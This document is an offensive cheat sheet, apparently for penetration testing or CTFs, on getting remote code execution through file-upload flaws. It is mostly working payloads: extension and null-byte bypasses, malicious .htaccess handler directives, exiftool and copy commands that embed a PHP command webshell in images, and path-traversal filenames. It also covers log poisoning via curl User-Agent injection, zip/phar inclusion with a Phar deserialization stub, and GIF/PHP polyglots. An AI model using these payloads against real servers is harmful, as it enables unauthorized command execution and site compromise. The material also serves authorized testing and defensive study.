# File Upload to RCE Techniques

## Extension Bypass

### Common Executable Extensions (by priority)

| Language | Extensions |
|----------|-----------|
| PHP | `.php` `.php3` `.php4` `.php5` `.php7` `.phtml` `.pht` `.phps` `.phar` |
| JSP | `.jsp` `.jspx` `.jspf` |
| ASP | `.asp` `.aspx` `.asa` `.ascx` `.ashx` |
| Python | `.py` `.pyc` `.pyo` |

### Case Bypass
```
.PhP .pHp .PHP .PhP5 .phtml
```

### Double-Write Bypass
```
.pphp   → after one filter pass becomes .php
.phphpp → after one filter pass becomes .php
```

### Null Byte Bypass (Old PHP/Java)
```
shell.php%00.jpg    # PHP < 5.3.4
shell.php\x00.jpg   # Some Java versions
```

### .htaccess Upload

Upload a `.htaccess` file to modify Apache parsing rules:

```apache
# Method 1: Make .jpg execute as PHP
AddType application/x-httpd-php .jpg

# Method 2: Custom handler
AddHandler php-script .jpg

# Method 3: Auto-include via php_value
php_value auto_prepend_file /tmp/evil.php

# Method 4: Inject via php_value
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.jpg"
```

## MIME Type Bypass

| Check method | Bypass approach |
|-------------|----------------|
| Check Content-Type | Change to `image/jpeg` / `image/png` / `image/gif` |
| Check file magic bytes | Prepend GIF89a / PNG header to payload |
| Check getimagesize() | Append payload to a real image (image shellcode) |
| Check file content | Use short tags + image header |

### Creating Image Shellcode
```bash
# Method 1: copy concat
copy normal.jpg/b + shell.php/a webshell.jpg

# Method 2: exif injection
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# Method 3: BMP pixel shellcode
# Encode PHP code as BMP pixel values to bypass image checks
```

## Directory Traversal Upload

```
# Inject path in filename
filename="../../../var/www/html/shell.php"
filename="shell.php%00.jpg"    # null byte
filename="....//....//shell.php"
```

## Log Poisoning

```bash
# 1. Inject PHP code into log
curl http://target/<?php system('id'); ?>

# 2. User-Agent injection
curl -H "User-Agent: <?php system('id'); ?>" http://target/

# 3. Include log file
# If LFI exists: ?file=/var/log/apache2/access.log
# Or: ?file=/var/log/nginx/access.log
```

## ZIP / Phar Exploitation

### ZIP PHP Webshell
```php
// Upload shell.zip containing shell.php
// Access via zip:// or phar:// protocol
// ?file=zip:///var/www/html/shell.zip%23shell.php
// ?file=phar:///var/www/html/shell.phar
```

### Phar Deserialization
```php
// Phar file meta-data is deserialized when file_exists() / is_file() etc. are called
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new EvilClass());  // malicious object
$phar->stopBuffering();
```

## Polyglot Files

```
# A file that is simultaneously a valid image and a PHP file
# GIF89a<?php system('id'); ?>
# Save with .php extension
# Or combine with .htaccess to have .gif parsed as PHP
```
